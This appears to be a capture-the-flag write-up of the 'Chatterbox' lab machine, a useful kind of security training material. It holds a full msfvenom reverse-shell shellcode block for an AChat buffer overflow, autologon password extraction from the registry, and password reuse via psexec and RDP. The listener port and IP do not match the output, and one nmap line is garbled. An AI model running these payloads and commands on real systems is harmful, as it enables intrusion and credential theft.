## Intro

Tags: #windows #WebApp #autologon #rdp #OSCPpath #medium

------------
# Reconnaissance

## Port scan

```shell
└─$ nmap -T4 -A -p- chatterbox.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2026-04-03 08:14 CEST
Nmap scan report for 10.129.27.60
Host is up (0.0069s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  ���7V      Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http        AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp  open  achat       AChat chat system
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49156/tcp open  msrpc       Microsoft Windows RPC
49157/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Network Distance: 2 hops
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 6h20m01s, deviation: 2h18m37s, median: 4h59m59s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-03T07:16:14-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-04-03T11:16:14
|_  start_date: 2026-04-03T11:12:43

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
1   6.83 ms 10.10.14.1
2   6.93 ms 10.129.27.60

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.87 seconds
```

----
# Foothold
## WebApp

### Vulnerable version

hmm the `AChat` seems a bit too specific , lets search for exploits 
```shell
└─$ searchsploit achat   
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                        | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                           | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                | php/webapps/24647.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
└─$ searchsploit -m 36025
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
    Codes: CVE-2015-1578, CVE-2015-1577, OSVDB-118206, OSVDB-118104
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (637)
Copied to: /home/emvee/Documents/HTB/Chatterbox/36025.py
```
now lets use it
```shell
└─$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.14.247 lport=3333 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3822 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x39\x6c\x69\x58\x61\x72\x79\x70"
buf += b"\x59\x70\x49\x70\x33\x30\x34\x49\x79\x55\x4c\x71"
buf += b"\x35\x70\x4f\x74\x34\x4b\x52\x30\x4c\x70\x32\x6b"
buf += b"\x50\x52\x6a\x6c\x34\x4b\x51\x42\x4a\x74\x34\x4b"
buf += b"\x63\x42\x4f\x38\x4a\x6f\x56\x57\x6f\x5a\x6f\x36"
buf += b"\x4c\x71\x6b\x4f\x66\x4c\x6f\x4c\x71\x51\x51\x6c"
buf += b"\x49\x72\x4e\x4c\x4b\x70\x77\x51\x66\x6f\x4c\x4d"
buf += b"\x6b\x51\x45\x77\x6a\x42\x6b\x42\x50\x52\x6f\x67"
buf += b"\x62\x6b\x51\x42\x4e\x30\x64\x4b\x70\x4a\x4f\x4c"
buf += b"\x62\x6b\x70\x4c\x6e\x31\x34\x38\x39\x53\x4d\x78"
buf += b"\x49\x71\x46\x71\x6f\x61\x64\x4b\x50\x59\x4d\x50"
buf += b"\x59\x71\x69\x43\x34\x4b\x30\x49\x6c\x58\x57\x73"
buf += b"\x6c\x7a\x4f\x59\x44\x4b\x4f\x44\x62\x6b\x4a\x61"
buf += b"\x57\x66\x70\x31\x4b\x4f\x54\x6c\x67\x51\x36\x6f"
buf += b"\x5a\x6d\x6d\x31\x35\x77\x6e\x58\x69\x50\x62\x55"
buf += b"\x6a\x56\x4a\x63\x71\x6d\x7a\x58\x4d\x6b\x53\x4d"
buf += b"\x4f\x34\x52\x55\x69\x54\x42\x38\x64\x4b\x71\x48"
buf += b"\x4c\x64\x49\x71\x48\x53\x50\x66\x72\x6b\x4a\x6c"
buf += b"\x70\x4b\x74\x4b\x30\x58\x4b\x6c\x69\x71\x76\x73"
buf += b"\x74\x4b\x6d\x34\x74\x4b\x59\x71\x38\x50\x43\x59"
buf += b"\x4d\x74\x4b\x74\x6f\x34\x71\x4b\x51\x4b\x63\x31"
buf += b"\x6e\x79\x50\x5a\x62\x31\x59\x6f\x39\x50\x4f\x6f"
buf += b"\x4f\x6f\x6f\x6a\x62\x6b\x6d\x42\x58\x6b\x62\x6d"
buf += b"\x61\x4d\x30\x68\x6c\x73\x30\x32\x6b\x50\x39\x70"
buf += b"\x73\x38\x43\x47\x34\x33\x30\x32\x51\x4f\x52\x34"
buf += b"\x52\x48\x4e\x6c\x54\x37\x6e\x46\x69\x77\x4b\x4f"
buf += b"\x59\x45\x75\x68\x64\x50\x69\x71\x59\x70\x79\x70"
buf += b"\x6f\x39\x79\x34\x4f\x64\x4e\x70\x70\x68\x6c\x69"
buf += b"\x53\x50\x32\x4b\x4d\x30\x6b\x4f\x39\x45\x50\x50"
buf += b"\x30\x50\x50\x50\x70\x50\x51\x30\x52\x30\x6d\x70"
buf += b"\x50\x50\x33\x38\x67\x7a\x5a\x6f\x39\x4f\x77\x70"
buf += b"\x69\x6f\x6a\x35\x52\x77\x62\x4a\x69\x75\x71\x58"
buf += b"\x4c\x4a\x79\x7a\x5a\x6e\x31\x37\x72\x48\x4a\x62"
buf += b"\x4d\x30\x4c\x51\x6f\x6c\x34\x49\x39\x56\x71\x5a"
buf += b"\x7a\x70\x51\x46\x71\x47\x72\x48\x75\x49\x46\x45"
buf += b"\x44\x34\x61\x51\x69\x6f\x76\x75\x32\x65\x69\x30"
buf += b"\x73\x44\x5a\x6c\x69\x6f\x30\x4e\x59\x78\x30\x75"
buf += b"\x6a\x4c\x73\x38\x6c\x30\x75\x65\x75\x52\x52\x36"
buf += b"\x49\x6f\x6a\x35\x51\x58\x32\x43\x52\x4d\x61\x54"
buf += b"\x79\x70\x75\x39\x68\x63\x4e\x77\x6f\x67\x61\x47"
buf += b"\x4e\x51\x6b\x46\x4f\x7a\x4c\x52\x6e\x79\x32\x36"
buf += b"\x49\x52\x59\x6d\x62\x46\x48\x47\x4e\x64\x6f\x34"
buf += b"\x4f\x4c\x4d\x31\x4a\x61\x52\x6d\x51\x34\x4f\x34"
buf += b"\x4c\x50\x46\x66\x59\x70\x6d\x74\x62\x34\x30\x50"
buf += b"\x32\x36\x32\x36\x70\x56\x4f\x56\x4e\x76\x30\x4e"
buf += b"\x52\x36\x70\x56\x70\x53\x51\x46\x61\x58\x74\x39"
buf += b"\x48\x4c\x6f\x4f\x53\x56\x4b\x4f\x76\x75\x44\x49"
buf += b"\x49\x50\x50\x4e\x30\x56\x30\x46\x4b\x4f\x4c\x70"
buf += b"\x32\x48\x5a\x68\x33\x57\x4b\x6d\x31\x50\x39\x6f"
buf += b"\x69\x45\x37\x4b\x78\x70\x66\x55\x66\x42\x71\x46"
buf += b"\x61\x58\x77\x36\x73\x65\x45\x6d\x53\x6d\x49\x6f"
buf += b"\x5a\x35\x6d\x6c\x4b\x56\x53\x4c\x79\x7a\x63\x50"
buf += b"\x6b\x4b\x69\x50\x71\x65\x6b\x55\x57\x4b\x50\x47"
buf += b"\x6c\x53\x72\x52\x70\x6f\x32\x4a\x79\x70\x72\x33"
buf += b"\x4b\x4f\x4a\x35\x41\x41"
```
copy this generated payload to the exploit code u downloaded from searchsploit, then start listener 
```shell
nc lvnp 3333
```
and run exploit:
```shell
└─$ python2 36025.py    
---->{P00F}!
```
got shell back
## Shell as alfred
```powershell
listening on [any] 4444 ...
10.129.27.60: inverse host lookup failed: Unknown host
connect to [10.10.14.71] from (UNKNOWN) [10.129.27.60] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

### Privileges

```powershell
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Windows\system32>
```

### Group memebership

```powershell
c:\Users\Alfred>net user alfred
net user alfred
User name                    Alfred
Full Name                    
Comment                      
User's comment               
Country code                 001 (United States)
Account active               Yes
Account expires              Never

Password last set            12/10/2017 10:18:08 AM
Password expires             Never
Password changeable          12/10/2017 10:18:08 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   4/3/2024 7:12:42 AM

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```
nothjing interesting here
### Systeminfo

```powershell
C:\Windows\system32>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          4/3/2024, 7:12:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,554 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,626 MB
Virtual Memory: In Use:    469 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
```
OS version is `Microsoft Windows 7 Professional (6.1.7601 Service Pack 1 Build 7601)`

### Users enumeration

```powershell
c:\Users\Alfred>net user
net user

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest                    
The command completed successfully.
```

### Autologon enumeration

```powershell
c:\Users\Alfred>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
```
#### creds obtained
```
Alfred
Welcome1!
```

------
# Privesc

### Password reuse

Since `445` (SMB) is open, lets try to use same password for `Administrator`

## Shell as Administrator over SMB

```powershell
└─$ psexec.py administrator:'Welcome1!'@$ip
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.129.27.60.....
[*] Found writable share ADMIN$
[*] Uploading file kvgkikOO.exe
[*] Opening SVCManager on 10.129.27.60.....
[*] Creating service cryl on 10.129.27.60.....
[*] Starting service cryl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
Chatterbox

C:\Windows\system32>ipconfig
 
Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.27.60
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

C:\Windows\system32>cd c:\users\administrator\desktop
 
c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 502F-F304

 Directory of c:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
04/03/2024  07:13 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,347,312,640 bytes free

c:\Users\Administrator\Desktop>type root.txt
Access is denied.
 
c:\Users\Administrator\Desktop>
```
it worked! but we cant print the root flag.. hm

## Shell as Administrator over RDP

it seems we dont have the right permissions on the file to allow us to read it, lets try via `RDP` too

#### Read root flag
```powershell
└─$ rdesktop $ip -u 'administrator' -p 'Welcome1!' 
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request
```
and here we could read the root.txt flag! but why did it work for rdp?

## RDP vs SMB

Over  SMB, Access Denied is the correct, expected result: the ACL says no, and SMB has no way to modify an ACL — it's just a file transfer protocol

**PsExec doesn't give you Alfred (or even a normal admin) — it gives you SYSTEM.** PsExec (classic or Impacket's `psexec.py`) authenticates over SMB, drops a service binary via `ADMIN$`, and the Service Control Manager launches that service. Services run under the `NT AUTHORITY\SYSTEM` context by default, regardless of which account's credentials you used to authenticate. So a PsExec shell ≠ a shell "as Alfred" or "as Administrator" — it's SYSTEM, a different security principal entirely.

**Why SYSTEM still gets denied on root.txt**

Normally SYSTEM has full access to basically everything, because most objects inherit permissions from their parent and SYSTEM gets an ACE by default. But on Chatterbox, `root.txt` has an explicit ACL that breaks that inheritance — one writeup shows the file's ACL as only:

`c:\Users\Administrator\Desktop\root.txt CHATTERBOX\Administrator:(F)`

vs. the parent Desktop folder, which still inherits broader access:

`c:\Users\Administrator\Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F) CHATTERBOX\Administrator:(I)(OI)(CI)(F) BUILTIN\Administrators:(I)(OI)(CI)(F) CHATTERBOX\Alfred:(I)(OI)(CI)(F)`

So the file itself was explicitly re-ACL'd to strip inherited entries and grant access to exactly one identity: `CHATTERBOX\Administrator`. Not `BUILTIN\Administrators` (the group), not `SYSTEM`, not Alfred — the literal local Administrator account.

**Why RDP works**

If you RDP in using the actual Administrator credentials, your token _is_ `CHATTERBOX\Administrator`, which matches that lone ACE — access granted. A SYSTEM shell from PsExec, no matter how "powerful" SYSTEM normally is, doesn't match that specific ACE, so it gets denied.

**The takeaway:** NTFS access checks aren't about "how privileged is my shell" — they're a literal SID match against the ACL. This is also why the classic fix from a SYSTEM/other shell is to steal or impersonate the Administrator's token (e.g., `incognito`, or migrating into a process already running as Administrator) rather than trying to brute-force more privilege — SYSTEM already has plenty of privilege, it's just the wrong identity for that one ACE.

-----
# Summary



----
# Sidenotes


